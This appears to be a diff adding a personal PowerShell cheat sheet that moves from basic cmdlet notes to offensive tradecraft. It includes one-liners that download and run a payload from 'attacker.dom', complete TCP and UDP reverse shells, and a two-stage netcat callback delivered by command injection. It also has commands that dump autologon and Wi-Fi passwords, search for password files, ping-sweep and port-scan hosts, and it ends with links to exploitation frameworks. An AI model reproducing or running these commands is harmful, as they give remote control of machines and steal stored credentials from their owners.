@@ -1,0 +1,88 @@
+Powershell
+
+Cmdlets
+	Syntax: Verb-Noun
+	common verbs:
+		Get Set Start Stop New Show Use Add Close Exit
+			-see Powershell Cookbook 3e appendix J
+	
+Basic *nix utility functions
+head || Get-Content in.csv -Head 10p
+tail || Get-Content in.csv -Tail 10p
+	
+
+Specific Esoteric Functions
+Select-String $string $dataRead -Context 1, 3 | % { $_.context.PreContext + $_.line + $_.Context.PostContext } |  out-file "C:\Results.txt"
+		--print 3 lines following instance of string
+	
+Get-ExecutionPolicy
+Set-ExecutionPolicy RemoteSigned
+Set-Location C:\powershell\scripts
+set workDrv=D:
+set workDir=powershell\scripts
+& "C:\powershell\scripts\script.ps1"
+
+
+Shells via powershell:
+WEBDL execute
+powershell -ExecutionPolicy Bypass -noLogo -Command Import-Module BitsTransfer;Start-BitsTransfer http://attacker.dom/shell.exe shell.exe;./shell.exe;
+powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://attacker.dom/shell.exe','shell.exe');./shell.exe;
+powershell -ExecutionPolicy Bypass -noLogo -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.dom/shell')
+RTCP shell
+$client = New-Object System.Net.Sockets.TCPClient("192.168.1.11",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+RUDP shell
+$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("192.168.1.11"),1337);$client = New-Object System.Net.Sockets.UDPClient(1337);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS> ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2>&1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()
+WEbInject callback (netcat)
+Stage1:	127.0.0.1 | powershell.exe (new-object System.Net.WebClient).Downloadfile('http://192.168.1.11/nc.exe', 'nc.exe')
+Stage2:	127.0.0.1 | nc.exe -e cmd.exe 192.168.1.11 21
+
+THIS IS WHY WE CALL IT 'WINDOWS EXPLOIT LANGUAGE'
+Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' | select defaultusername,defaultpassword
+	-dump stored autologon password
+DUMP WIFI PASSWORD
+$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
+$exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
+$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
+	OR
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+	OR
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} |%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+	OR
+foreach($profil in (netsh wlan show profiles | Select-String ':')){foreach($line in (netsh wlan show profiles name=($profil.toString().split(':')[1].trim()) key=clear)){$line+';'}};
+
+
+
+LOCAL SYSTEM ENUMERATION
+((New-Object System.Security.Principal.SecurityIdentifier("S-1-5-19")).translate([System.Security.Principal.NTAccount])).value
+	-get user from known SID
+gwmi win32_userprofile | select -unique @{name="Name";expression={$_.__server}},@{name="SID";expression={$_.sid}},@{name="LastUseTime";expression={$_.converttodatetime($_.lastusetime)}},localpath | ft -auto
+	-get sids for localgroup users and print lastlogon for each
+gps | ?{$_.name -match "<process/service name>"} | ?{$_.id -match "<process/service id>"} | select *
+	-query infor for process or service by name
+[System.IO.DriveInfo]::GetDrives()
+	-query drives on localhost
+PS C:\> Get-ChildItem "C:\Users\" - recurse -include *passwords*.txt 
+	-search recursively for filenames matching a pattern
+
+	
+ACTIVE DIRECTORY ENUMERATION
+Get-ADGroupMember -Credential $cred -server master.local "Domain Admins"
+
+
+WORKGROUP/Local Network Enumeration
+PS C:\> 1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_ | SelectString  ttl} 
+	-ping sweep class C subnet to which localhost is connected
+PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.11.10.11",$_)) "Port $_ open"} 2>$null 
+	-portscan target host
+
+
+
+	
+LINKS, COME GET YOUR LINKS! READ ALL ABOUT IT!
+POWERSHELL EMPIRE (remote exploitation framework)
+https://www.powershellempire.com/
+https://github.com/EmpireProject/Empire
+https://github.com/interference-security/empire-web
+NISHANG (privesc-framework)
+https://github.com/samratashok/nishang
+POWERSPLOIT (post-exploitation-framework)
